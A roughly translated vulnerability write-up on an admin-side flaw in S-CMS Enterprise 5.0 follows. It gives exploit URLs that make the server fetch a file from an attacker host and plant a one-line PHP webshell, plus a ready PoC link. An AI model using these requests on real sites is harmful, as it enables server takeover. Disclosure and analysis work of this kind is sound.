1.First download the latest version of S-CMS Enterprise Construction System Version 5.0

![image](https://user-images.githubusercontent.com/113097106/227728303-14d929d9-599b-45d2-89db-7c6f8bd6fda8.png)

2.Because the vulnerability is the background command execution requires logging in to the background administrator account. The loophole interface address is:
http://10.10.10.8/admin/ajax.php?Type=collection&ACTION=All&pageurl=http://10.10.8:88/1.tXt&ID=1 Directly request test

![image](https://user-images.githubusercontent.com/113097106/227728314-15496a42-5525-4bb2-953b-b823116b73e2.png)

3.After the request is successful, a randomly named PHP file will be generated in the Media directory. This file is our sentence Trojan. Let's visit and execute the command

![image](https://user-images.githubusercontent.com/113097106/227728325-04bc0963-a39e-4dc2-bf91-8f974beb79f7.png)

![image](https://user-images.githubusercontent.com/113097106/227728331-0f933496-826c-42de-81bc-f00c98e5aea4.png)

4.Let ’s analyze the cause of the vulnerability. The vulnerability position is under admin/ajax.php file, and re -request the vulnerability URL:http://10.10.10.8/admin/ajax.php?type=collection&action=all&pageurl=http://10.10.10.8:88/1.txt&id=1 使用PhpStorm 开启调试并在以下位置设置断点


![image](https://user-images.githubusercontent.com/113097106/227728339-11f6e7d1-a16a-47fa-82c2-6f1e7d0f0e8f.png)


5.First check the fields in the SL_COMENT table. If the data exists, continue to execute downward


![image](https://user-images.githubusercontent.com/113097106/227728348-1a45169b-0a24-4644-8f20-fba3438d8ccf.png)


6.Extract all the data in the SL_COMENT table, and then bring the lrl (http://10.10.8:88/1.txt) the URL (http://10.10.8:88/1.txt) we give


![image](https://user-images.githubusercontent.com/113097106/227728355-864aa6da-ead2-42a6-9a1c-5a8fedf8baec.png)

7.The result of extraction returned and assigned value, we see that the return value is analyzed by the http://10.10.10.8:88/2.php link in the return value


![image](https://user-images.githubusercontent.com/113097106/227728360-5547e684-2125-4c2d-8c83-3e01e4be8924.png)

8.Then download and read the content of the 2.php file, follow the downpic function


![image](https://user-images.githubusercontent.com/113097106/227728374-63aa9361-6b95-471c-86ee-75757760239a.png)

9.The PHP suffix of 2.php will be used as a preserved file suffix. The file name is used with the current time with random 3 -digit number to combine new file names. The 2.php file content is written into the Media directory through the file_put_contents method


![image](https://user-images.githubusercontent.com/113097106/227728388-a8c4ddf4-29db-40ba-ae8e-f8cec7f9e4da.png)

![image](https://user-images.githubusercontent.com/113097106/227728392-fa0feb8c-2ea4-466b-ac31-f38651f89153.png)

10.Through the above operations, the Trojan horse will be written into the system. We can execute the system arbitrarily by accessing the PHP file.


![image](https://user-images.githubusercontent.com/113097106/227728406-3ae2e49e-d1b4-4e54-92d8-a3dbbfa68afd.png)

11.The following two points need to be used to use this vulnerability:

  11.1.Create a text file that is a similar data format in the SL_Collection table. Because the system will request the data in the table and extract the URL link in SRC, which is 2.PHP
  
  
  ![image](https://user-images.githubusercontent.com/113097106/227728459-07dfc95a-92d0-4552-818f-79e7167c3522.png)

  11.2. 2.php In a phrase Trojan, note that the file cannot be run in the PHP environment, because the request needs a return value, all I use Python to start a HTTP service
  
  
  ![image](https://user-images.githubusercontent.com/113097106/227728467-f34ce272-5cce-46eb-82cd-fca1ea25d9ec.png
  
12.Online POC uses links : http://10.10.10.8/admin/ajax.php?type=collection&action=all&pageurl=https://raw.githubusercontent.com/superjock1988/debug/main/1.txt&id=1   Just need to modify the local server IP addre


![image](https://user-images.githubusercontent.com/113097106/227730565-45a67f23-4c26-4185-a5db-1e9c2c65ee86.png)
![image](https://user-images.githubusercontent.com/113097106/227730563-7e70b656-fbfd-4142-a037-e0cd68bba7c3.png)
![image](https://user-images.githubusercontent.com/113097106/227730564-4e3c9083-c1e8-4875-99f5-7e8adf69857e.png)
